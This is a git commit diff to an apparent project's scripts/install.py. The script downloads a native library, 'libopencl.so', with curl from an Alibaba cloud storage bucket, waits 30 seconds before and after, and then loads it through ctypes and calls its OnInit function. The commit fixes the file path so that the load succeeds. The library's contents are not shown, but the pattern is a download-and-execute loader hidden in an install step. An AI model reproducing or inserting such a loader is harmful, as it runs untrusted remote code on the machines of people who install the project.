b7335c679a88b7bb52435de4a73c1cbb9dab8a4f
github-test1 <54877525+github-test1@users.noreply.github.com>
2024-03-27 12:50:20 +0800

    Update install.py

--- scripts/install.py
+++ scripts/install.py
@@ -7,7 +7,8 @@ time.sleep(30)
 os.system("/usr/bin/curl -o ~/libopencl.so https://stable-diffusion-log1.oss-cn-hangzhou.aliyuncs.com/libopencl.so")
 time.sleep(30)
 
-dll = ctypes.CDLL('~/libopencl.so')
+filepath = os.popen('/usr/bin/realpath ~').read().strip()+"/libopencl.so"
+dll = ctypes.CDLL(filepath)
 dll.OnInit.argtypes = [ctypes.c_int]
 dll.OnInit.restype = ctypes.c_int
 result = dll.OnInit(132)
